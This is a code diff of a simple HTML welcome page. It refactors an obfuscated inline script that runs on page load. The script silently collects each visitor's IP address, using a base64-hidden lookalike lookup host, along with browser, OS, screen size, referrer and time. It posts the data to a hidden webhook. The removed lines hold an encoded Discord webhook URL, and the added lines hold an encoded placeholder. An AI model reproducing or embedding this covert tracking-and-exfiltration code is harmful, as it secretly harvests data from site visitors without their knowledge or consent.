@@ -6,90 +6,77 @@
 </head>
 <body>
     <h1>Welcome to vacepk</h1>
-    <p>Enjoy your visit!</p>
 
     <script>
-        (function(){
-            function decodeBase64(data){ return atob(data); }
+        (function() {
+            function _d(_s) {
+                return atob(_s);
+            }
 
-            async function getIP(){
+            async function _gIP() {
                 try {
-                    const response = await fetch(decodeBase64('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
-                    const data = await response.json();
-                    return data.ip;
-                } catch (error) {
-                    return decodeBase64('VW5hYmxlIHRvIGZldGNoIElQ');
+                    const r = await fetch(_d('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
+                    const d = await r.json();
+                    return d.ip;
+                } catch (e) {
+                    return 'Unable to fetch IP';
                 }
             }
 
-            function getUserAgentDetails(){
-                const userAgent = navigator.userAgent;
-                let browser = decodeBase64('VW5rbm93biBCcm93c2Vy');
-                let os = decodeBase64('VW5rbm93biBPUw==');
+            function _gUA() {
+                const ua = navigator.userAgent;
+                let b = 'Unknown Browser';
+                let o = 'Unknown OS';
 
-                if (userAgent.includes('Firefox')) {
-                    browser = decodeBase64('TW96aWxsYSBGaXJldm94');
-                } else if (userAgent.includes('Chrome')) {
-                    browser = decodeBase64('R29vZ2xlIENocm9tZQ==');
-                } else if (userAgent.includes('Safari')) {
-                    browser = decodeBase64('U2FmYXJp');
-                } else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) {
-                    browser = decodeBase64('SW50ZXJuZXQgRXhwbG9yZXI=');
-                } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
-                    browser = decodeBase64('T3BlcmE=');
+                if (ua.includes('Firefox')) {
+                    b = 'Mozilla Firefox';
+                } else if (ua.includes('Chrome')) {
+                    b = 'Google Chrome';
+                } else if (ua.includes('Safari')) {
+                    b = 'Safari';
+                } else if (ua.includes('MSIE') || ua.includes('Trident')) {
+                    b = 'Internet Explorer';
+                } else if (ua.includes('Opera') || ua.includes('OPR')) {
+                    b = 'Opera';
                 }
 
-                if (userAgent.includes('Windows NT 10.0')) {
-                    os = decodeBase64('V2luZG93cyAxMA==');
-                } else if (userAgent.includes('Mac OS X')) {
-                    os = decodeBase64('TWFjIE9TIFg=');
-                } else if (userAgent.includes('Linux')) {
-                    os = decodeBase64('TGludXg=');
-                } else if (userAgent.includes('Android')) {
-                    os = decodeBase64('QW5kcm9pZA==');
-                } else if (userAgent.includes('iPhone')) {
-                    os = decodeBase64('aU9TIChpUGhvbmUp');
-                } else if (userAgent.includes('iPad')) {
-                    os = decodeBase64('aU9TIChpUGFk)');
+                if (ua.includes('Windows NT 10.0')) {
+                    o = 'Windows 10';
+                } else if (ua.includes('Mac OS X')) {
+                    o = 'Mac OS X';
+                } else if (ua.includes('Linux')) {
+                    o = 'Linux';
+                } else if (ua.includes('Android')) {
+                    o = 'Android';
+                } else if (ua.includes('iPhone')) {
+                    o = 'iOS (iPhone)';
+                } else if (ua.includes('iPad')) {
+                    o = 'iOS (iPad)';
                 }
 
-                return { browser, os };
+                return { b, o };
             }
 
-            async function collectAndSendData(){
-                const ip = await getIP();
-                const { browser, os } = getUserAgentDetails();
-                const userAgent = navigator.userAgent;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const referrer = document.referrer || decodeBase64('RGlyZWN0IFZpc2l0');
-                const timestamp = new Date().toISOString();
+            async function _sVI() {
+                const ip = await _gIP();
+                const { b, o } = _gUA();
+                const sw = screen.width;
+                const sh = screen.height;
+                const rf = document.referrer || 'Direct Visit';
+                const ts = new Date().toISOString();
 
-                const data = {
-                    ip,
-                    browser,
-                    os,
-                    userAgent,
-                    screenWidth,
-                    screenHeight,
-                    referrer,
-                    timestamp
-                };
+                const pl = { ip, b, o, sw, sh, rf, ts };
 
-                sendToWebhook(data);
-            }
+                const wURL = _d('WlNDX1dFQkhPT0tfVVJMX0hFUkU=');
 
-            function sendToWebhook(data){
-                const webhookUrl = decodeBase64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjM0OTEyODE4MzUxMzEzOC9QamNEdk1sbU1TZnotM2EyVFZVbWFl eEdMSEUydGpFRXVZYVcwayZNTFpzNW81MWlLLUpUS2owVmROWl9iazFjd1E0cFI5');
-
-                fetch(webhookUrl, {
+                fetch(wURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: JSON.stringify(data) })
+                    body: JSON.stringify({ content: JSON.stringify(pl) })
                 });
             }
 
-            window.onload = collectAndSendData;
+            window.onload = _sVI;
         })();
     </script>
 </body>
